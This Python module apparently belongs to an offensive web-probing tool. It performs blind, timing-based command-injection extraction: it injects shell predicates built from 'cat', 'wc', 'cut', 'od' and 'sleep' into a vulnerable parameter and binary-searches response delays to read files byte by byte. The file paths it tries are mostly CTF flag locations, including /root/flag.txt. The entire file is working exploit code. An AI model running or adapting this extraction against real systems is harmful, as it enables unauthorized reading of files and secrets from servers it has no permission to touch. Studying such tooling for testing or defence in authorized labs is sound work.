from __future__ import annotations

import time
from typing import Callable

from ravage.web_core.http_probe import ProbeResponse
from ravage.probe_suite_parts.command.command_payloads import (
    _COMMAND_TIMING_DELAY_SECONDS,
    _COMMAND_TIMING_THRESHOLD_MS,
    _replace_command_probe,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_COMMAND_EXTRACT_FLAG_PATHS = (
    "/FLAG",
    "/FLAG.txt",
    "/flag",
    "/flag.txt",
    "/tmp/FLAG",
    "FLAG.txt",
    "FLAG",
    "flag",
    "flag.txt",
    "/app/FLAG",
    "/app/FLAG.txt",
    "/app/flag",
    "/app/flag.txt",
    "/usr/src/app/FLAG",
    "/usr/src/app/FLAG.txt",
    "/usr/src/app/flag",
    "/usr/src/app/flag.txt",
    "/srv/app/FLAG",
    "/workspace/FLAG.txt",
    "/workspace/FLAG",
    "/workspace/flag",
    "/workspace/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/var/www/html/FLAG",
    "/var/www/html/FLAG.txt",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/srv/app/FLAG.txt",
    "/srv/app/flag",
    "/srv/app/flag.txt",
    "/root/flag.txt",
)
_COMMAND_EXTRACT_MAX_CHARS = 48
_COMMAND_EXTRACT_WALL_CLOCK_SECONDS = 25.0

def _length_predicate_command(file_path: str, mid: int) -> str:
    return (
        f"test $(cat {file_path} 2>/dev/null | wc -c) -gt {mid} "
        f"&& sleep {_COMMAND_TIMING_DELAY_SECONDS}"
    )

def _byte_predicate_command(file_path: str, position: int, mid: int) -> str:
    return (
        f"test $(cat {file_path} 2>/dev/null | cut -c {position} | od -An -tuC) "
        f"-gt {mid} && sleep {_COMMAND_TIMING_DELAY_SECONDS}"
    )

def _blind_command_length(eval_sleep: Callable[[str], bool], file_path: str) -> int:
    if not eval_sleep(_length_predicate_command(file_path, 0)):
        return 0
    low, high = 0, 96
    while low < high:
        mid = (low + high + 1) // 2
        if eval_sleep(_length_predicate_command(file_path, mid)):
            low = mid
        else:
            high = mid - 1
    return low + 1

def _blind_command_byte(eval_sleep: Callable[[str], bool], file_path: str, position: int) -> int:
    low, high = 31, 126
    while low < high:
        mid = (low + high + 1) // 2
        if eval_sleep(_byte_predicate_command(file_path, position, mid)):
            low = mid
        else:
            high = mid - 1
    code = low + 1
    if 32 <= code <= 126:
        return code
    return 0

def _extract_command_file(
    eval_sleep: Callable[[str], bool],
    file_paths: tuple[str, ...] = _COMMAND_EXTRACT_FLAG_PATHS,
    *,
    should_stop: Callable[[], bool] | None = None,
    max_chars: int = _COMMAND_EXTRACT_MAX_CHARS,
) -> tuple[str, str]:
    for file_path in file_paths:
        if should_stop and should_stop():
            break
        length = _blind_command_length(eval_sleep, file_path)
        if length <= 0:
            continue
        chars: list[str] = []
        for position in range(1, min(length, max_chars) + 1):
            if should_stop and should_stop():
                break
            code = _blind_command_byte(eval_sleep, file_path, position)
            if code <= 0:
                break
            chars.append(chr(code))
            if recognize_proofs("".join(chars)):
                break
        value = "".join(chars)
        if value:
            return file_path, value
    return "", ""

def _command_timing_extraction(
    *,
    send_payload: Callable[[str], ProbeResponse],
    timing_payload: str,
    marker: str,
    baseline_ms: int,
    target_brief: dict[str, object],
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    state = {"budget": budget}
    deadline = time.monotonic() + _COMMAND_EXTRACT_WALL_CLOCK_SECONDS

    def should_stop() -> bool:
        return state["budget"] <= 0 or time.monotonic() >= deadline

    def eval_sleep(command: str) -> bool:
        if should_stop():
            return False
        payload = _replace_command_probe(timing_payload, marker, command)
        if not payload:
            return False
        state["budget"] -= 1
        response = send_payload(payload)
        requests.append(
            response.summary(body_chars=80) | {"probe_kind": "command_timing_extract", "cmd": command[:160]}
        )
        return response.status is not None and response.elapsed_ms - baseline_ms >= _COMMAND_TIMING_THRESHOLD_MS

    file_path, value = _extract_command_file(eval_sleep, should_stop=should_stop)
    findings: list[dict[str, object]] = []
    if value:
        proofs = recognize_proofs(value)
        finding_type = "command_blind_extraction"
        if proofs:
            finding_type = "command_boundary_proof"
        findings.append(
            {
                "type": finding_type,
                "input": target_brief,
                "channel": "timing_file_read",
                "file": file_path,
                "proofs": proofs[:5],
                "extracted": value,
                "complete": bool(proofs),
            }
        )
    return findings, requests, state["budget"]
